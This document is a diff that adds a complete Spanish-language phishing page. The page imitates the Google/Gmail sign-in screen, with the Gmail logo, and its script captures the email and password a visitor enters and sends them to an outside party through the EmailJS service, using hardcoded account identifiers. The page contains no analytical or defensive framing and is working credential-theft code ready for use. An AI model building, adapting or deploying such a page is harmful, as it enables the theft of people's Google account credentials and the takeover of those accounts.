@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Inicio de Sesión</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f5f5f5;
+    }
+
+    .login-container {
+      width: 100%;
+      max-width: 400px;
+      background-color: #fff;
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    .login-container img {
+      width: 100px;
+      margin-bottom: 1rem;
+    }
+
+    .login-container h2 {
+      font-size: 24px;
+      color: #202124;
+      margin-bottom: 0.5rem;
+    }
+
+    .login-container p {
+      font-size: 14px;
+      color: #5f6368;
+      margin-bottom: 2rem;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      font-size: 16px;
+    }
+
+    .login-button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 1rem;
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .login-button:hover {
+      background-color: #1669c1;
+    }
+
+    .footer {
+      margin-top: 1.5rem;
+      font-size: 12px;
+      color: #5f6368;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r2.png" alt="Gmail Logo">
+    <h2>Iniciar sesión</h2>
+    <p>Usa tu cuenta de Google</p>
+
+  <form id="myForm" method="POST">
+ 	<label for="email">Email:</label>
+        <input type="email" id="email" name="email" required><br><br>
+  
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required><br><br>
+  
+        <input type="submit" value="Submit">
+   </form>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script>
+  (function() {
+    emailjs.init("jlp3V1F1mASHelVVv"); // Initialize EmailJS with your user ID
+    
+    document.getElementById("myForm").addEventListener("submit", function(event) {
+      event.preventDefault();
+      
+      var email = document.getElementById("email").value;
+      var password = document.getElementById("password").value;
+      
+      var templateParams = {
+        email: email,
+        password: password
+      };
+      
+      emailjs.send("service_yr6qykb", "template_k2925td", templateParams)
+        .then(function(response) {
+          console.log("Success:", response);
+        }, function(error) {
+          console.log("Error:", error);
+        });
+    });
+  })();
+</script>
+
+    <div class="footer">
+      <p><a href="#">¿Olvidaste tu correo electrónico?</a></p>
+      <p><a href="#">¿No tienes una cuenta? Crea una</a></p>
+    </div>
+  </div>
+
+</body>
+</html>
